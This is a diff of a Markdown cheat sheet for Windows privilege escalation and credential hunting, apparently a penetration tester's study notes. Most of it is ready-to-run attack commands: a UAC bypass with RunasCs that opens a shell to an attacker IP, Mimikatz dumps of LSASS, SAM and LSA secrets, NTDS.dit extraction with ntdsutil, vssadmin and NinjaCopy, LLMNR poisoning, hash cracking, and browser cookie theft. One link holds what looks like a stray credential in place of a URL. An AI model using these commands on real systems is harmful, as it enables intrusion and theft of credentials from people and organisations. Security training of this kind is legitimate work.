@@ -130,16 +130,16 @@
             *   `reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin`
         *   Bypasess
             *   `[environment]::OSVersion.Version` → [UACME](https://github.com/hfiref0x/UACME)
+            *   RunAs
+                *   [PS Module](https://github.com/BC-SECURITY/Empire/blob/main/empire/server/data/module_source/management/Invoke-RunAs.ps1) / [Executable](https://github.com/antonioCoco/RunasCs/releases)
+                *   `.\RunasCs.exe [USER] [PASSWORD] cmd -r [KALI_IP]:[PORT]`
+                *   `Invoke-RunAs -username [USER] -password "[PASSWORD]" -Cmd cmd -Remote [KALI_IP]:[PORT] -BypassUac`
             *   FodHelper
                 *   [Download File](https://FodhelperUACBypass.ps1 ) → Windows 10 OS
                 *   PS Session          → `FodhelperUACBypass -program "cmd.exe /c [CMD_COMMAND]"`
             *   EventViewer
                 *   [Download File](https://github.com/CsEnox/EventViewer-UACBypass) → `Import-Module Invoke-EventViewer`
                 *   PS Session          → `Invoke-EventViewer [PATH\TO\MALWARE.exe]`
-            *   RunAs
-                *   [PS Module](https://github.com/BC-SECURITY/Empire/blob/main/empire/server/data/module_source/management/Invoke-RunAs.ps1) / [Executable](https://github.com/antonioCoco/RunasCs/releases)
-                *   `.\RunasCs.exe [USER] [PASSWORD] cmd -r [KALI_IP]:[PORT]`
-                *   `Invoke-RunAs -username [USER] -password "[PASSWORD]" -Cmd cmd -Remote [KALI_IP]:[PORT] -BypassUac`
             *   PSExec
                 *   Local       → `PsExec.exe -h -s -i cmd`
                 *   Remote  → `psexec.py [AUTH_STRING]`
@@ -178,20 +178,6 @@
         *   `Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo`
         *   [PowerUP-SQL Sheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)
         *   [Exploitations](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/abusing-ad-mssql#mssql-basic-abuse)
-    *   SMB Access
-        *   Enumeration
-            *   `Find-DomainShare -CheckShareAccess` 
-            *   `Invoke-ShareFinder`
-            *   `Invoke-FileFinder`
-        *   Share Access
-            *   `net use x: \\[HOST]\[SHARE] "[empty/password]" /u:[empty/Guest/user]`
-        *   Scraping
-            *   `Snaffler.exe -s -d [DOMAIN] -o snaffler.log -v data`
-            *   `Snaffler.exe -s -i \\[HOST]\[SHARE]`
-        *   LLMNR
-            *   [NTLM\_Theft](https://github.com/Greenwolf/ntlm_theft)
-            *   `Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput`
-            *   Cracking  → `hashcat -m 5600`
 *   Users
     *   Service Accounts < Normal Users < Administrator → Determine EOP Path
     *   Authentication
@@ -263,53 +249,44 @@
                 *   GodPotato / SweetPotato
                 *   [PrintSpoofer](https://setuserinfo christopher.lewis 23 'Admin!23')
             *   [SeTakeOwnership](https://academy.hackthebox.com/module/67/section/642)
-                *   Full Objects Access
+                *   Arbitrary File/Directory Control
                 *   `takeown /f "[FILE/FOLDER]"`
                 *   `icacls "[FILE/FOLDER]" /grant %username%:F`
             *   [SeLoadDriver](https://academy.hackthebox.com/module/67/section/605)
                 *   [Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)        → `EoPLoadDriver.exe System\CurrentControlSet\Capcom capcom.sys`
                 *   [ExploitCapcom](https://github.com/tandasat/ExploitCapcom) → Modify CPP → VS2019 Compiling → Execute Malware
             *   [SeDebug](https://github.com/decoder-it/psgetsystem)
-                *   Credential Dumping
-                    *   `Invoke-Mimikatz '"privilege::debug" "token:elevate" "lsadump::lsa /patch"'`
-                    *   `Invoke-Mimikatz '"privilege::debug" "token:elevate" "vault::cred /patch"'`
+                *   LSASS / DPAPI / VAULT Dumping
                     *   `Invoke-Mimikatz '"privilege::debug" "token:elevate" "sekurlsa::logonpasswords"'`
-                    *   `Invoke-Mimikatz '"privilege::debug" "token:elevate" "lsadump::secrets"'`
+                    *   `Invoke-Mimikatz '"privilege::debug" "token:elevate" "sekurlsa::dpapi"'`
+                    *   `Invoke-Mimikatz ‘"privilege::debug" "token:elevate" "sekurlsa::credman"’`
+                *   SAM / LSA Dumping
                     *   `Invoke-Mimikatz '"privilege::debug" "token:elevate" "lsadump::sam"'`
-                *   LSASS DMP
-                    *   `Get-Process lsass` → `rundll32 C:\windows\system32\comsvcs.dll, MiniDump [PID] [OUT.dmp] full`
-                    *   GUI Access → Task Manager + “Create dump file” (LSASS)
-                    *   Windows    → `Invoke-Mimikatz '"privilege::debug" "token:elevate" "sekurlsa::minidump [LSASS.dmp]"'`
-                    *   Linux           → `pypykatz lsa minidump [LSASS.dmp]`
+                    *   `Invoke-Mimikatz '"privilege::debug" "token:elevate" "lsadump::lsa /patch"'`
                 *   SYSTEM RCE
-                    *   PID → `tasklist /v /fi "username eq SYSTEM"`
-                    *   `ipmo psgetsys.ps1; ImpersonateFromParentPid -ppid [PID] -command [CMD] -cmdargs [ARGS]`
-                    *   [Method 2](https://github.com/bruno-1337/SeDebugPrivilege-Exploit) / [Method 3](https://github.com/dev-zzo/exploits-nt-privesc/blob/master/SeDebugPrivilege/SeDebugPrivilege.c)
+                    *   Get PID       → `tasklist /v /fi "username eq SYSTEM"`
+                    *   [Method 1](https://github.com/decoder-it/psgetsystem/blob/master/psgetsys.ps1)  → `. .\psgetsys.ps1; ImpersonateFromParentPid -ppid [PID] -command [CMD] -cmdargs [ARGS]`
+                    *   [Method 2](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
+                    *   [Method 3](https://github.com/dev-zzo/exploits-nt-privesc/blob/master/SeDebugPrivilege/SeDebugPrivilege.c)
             *   [SeBackup](https://academy.hackthebox.com/module/67/section/601)
-                *   Arbitrary File Copy
-                    *   `robocopy /B [SRC] [DEST]`
                 *   SAM Dumping
-                    *   `reg save hklm\sam c:\windows\temp\sam.sav`
-                    *   `reg save hklm\system c:\windows\temp\system.sav`
-                    *   `samdump2 system.sav sam.sav`
+                    *   `secretsdump.py -security SECURITY.save -sam SYSTEM.save LOCAL`
+                    *   `reg save hklm\sam c:\windows\temp\SAM.save`
+                    *   `reg save hklm\system c:\windows\temp\SYSTEM.save`
                 *   NTDS Dumping
-                    *   `powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\windows\temp' q q"`
-                    *   `secretsdump.py -system [SYSTEM] -security [SECURITY] -ntds [NTDS] local`
-                    *   Restic Method
-                        *   `.\restic.exe -r C:\Windows\Temp\ntds backup C:\Windows --use-fs-snapshot`
-                    *   Disk Shadow Method
-                        *   `diskshadow.exe`
-                        *   `set verbose on`
-                        *   `set metadata C:\Windows\Temp\meta.cab`
-                        *   `set context clientaccessible`
-                        *   `set context persistent` 
-                        *   `begin backup` 
-                        *   `add volume C: alias cdrive`
-                        *   `create`
-                        *   `expose %cdrive% E:`
-                        *   `end backup`
-                        *   `exit`
-                        *   `robocopy /B E:\Windows\NTDS .\ntds ntds.dit`
+                    *   `secretsdump.py -ntds NTDS.dit.save -system SYSTEM.save LOCAL`
+                    *   NTDSUtil
+                        *   `powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\windows\temp\NTDS' q q"`
+                        *   `C:\Windows\Temp\NTDS\Active Directory\ntds.dit`
+                        *   `C:\Windows\Temp\NTDS\registry\SYSTEM`
+                    *   VSSAdmin
+                        *   `vssadmin create shadow /for=C:`
+                        *   `copy $ShadowCopyName\Windows\NTDS\NTDS.dit C:\Windows\Temp\NTDS.dit.save`
+                        *   `copy $ShadowCopyName\Windows\System32\config\SYSTEM C:\Windows\Temp\SYSTEM.save`
+                    *   NinjaCopy
+                        *   Stealthy Approach
+                        *   `Invoke-NinjaCopy.ps1 -Path "C:\Windows\NTDS\NTDS.dit" -LocalDestination "C:\Windows\Temp\NTDS.dit.save"`
+                        *   `reg save hklm\system c:\windows\temp\SYSTEM.save`
             *   [SeManageVolume](https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public?source=post_page-----b95d3146cfe9--------------------------------)
             *   [SeRestore](https://github.com/xct/SeRestoreAbuse)
     *   Credentials Hunting
@@ -320,15 +297,11 @@
             *   [`https://github.com/carlospolop/MSF-Credentials`](https://github.com/carlospolop/MSF-Credentials)
             *   WinPEAS / PowerUP
         *   Hash Dumping (Local Admin)
-            *   SeBackup Exploits
-            *   SeDebug Exploits
+            *   SeBackup / SeDebug Exploits
+            *   Process Memory → `lazagne.exe memory`
         *   CMDKey Storage
             *   `cmdkey /list`
-            *   `runas /savecred /user:[USER] "\\[KALI_IP]\Share\shell.exe"`
-        *   PS Credential Files
-            *   Extensions → `.cred`, `.xml`
-            *   `$credential = Import-Clixml -Path [FILE.xml]`
-            *   `$credential.GetNetworkCredential().[username/password]`
+            *   `runas /savecred /user:[USER] “\\[KALI_IP]\Share\shell.exe”`
         *   Web Applications
             *   Web Roots            → `c:\xampp\htdocs`, `c:\inetpub\wwwroot`
             *   Host Mappings    → `default`, `000-default.conf`
@@ -336,6 +309,18 @@
             *   DB Files                 → `*[db/database/settings/config].*`, `*.db`, `.sql*`
             *   Code Analysis      → Sensitive Exposure / Docker Files / Inputs & Functions / Connection Strings / Dependencies
             *   Write Privileges   → WebShell + LOCAL/NETWORK Impersonate Escalation
+        *   SMB Access
+            *   `Find-DomainShare -CheckShareAccess` 
+            *   `Invoke-ShareFinder` /`Invoke-FileFinder`
+            *   Shares
+                *   `net use x: \\[HOST]\[SHARE] "[empty/password]" /u:[empty/Guest/user]`
+            *   Password Scraping
+                *   `Snaffler.exe -s -d [DOMAIN] -o snaffler.log -v data`
+                *   `Snaffler.exe -s -i \\[HOST]\[SHARE]`
+            *   LLMNR
+                *   [NTLM\_Theft](https://github.com/Greenwolf/ntlm_theft)
+                *   `Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput`
+                *   Cracking  → `hashcat -m 5600`
         *   GIT Repositories
             *   Directories → `.git` / `.gitignore`
             *   `git log --oneline` 
@@ -346,6 +331,10 @@
             *   `dir /R [PATH]`
             *   `Get-Item * -Stream *`
             *   `Get-Content .\[FILE] -Stream [ADS_FILE]`
+        *   PS Credential Files
+            *   Extensions → `.cred`, `.xml`
+            *   `$credential = Import-Clixml -Path [FILE.xml]`
+            *   `$credential.GetNetworkCredential().[username/password]`
         *   File Hunting
             *   Content Search
                 *   `findstr /SIM /C:"[password/pass/psw/pwd/credentials][=/:/',/",]" *.[EXT_OR_*]`
@@ -369,6 +358,7 @@
             *   Meterpreter → `post/windows/gather/credentials/teamviewer_passwords`
             *   [Manual Cracking](https://0xdf.gitlab.io/2020/09/05/htb-remote.html)
         *   Browser Sessions
+            *   `lazagne.exe browsers`
             *   `SharpChrome.exe logins /unprotect`
             *   `Invoke-SharpChromium -Command "cookies slack.com"`
             *   `copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .`
@@ -425,7 +415,7 @@
         *   Local Services
             *   `netstat -ano`             → `ESTABILISHED/LISTEN` → `127.0.0.1` / `::1` / `[INTRANET_IP]`
             *   Associated Process  → `tasklist | findstr [SERVICE_PID]` → Check Privilege / Process String
-            *   Configuration Files  → All Services + Permissions
+            *   Configuration Files  → All Services + Permissions (MySQL → `my.cnf`)
             *   DB Access                   → Data Dump / Blank Password / [UDF Escalation](https://juggernaut-sec.com/mysql-user-defined-functions/)
             *   Local Forwarding
             *   Splunk Forwarder / Erlang Port (25672)
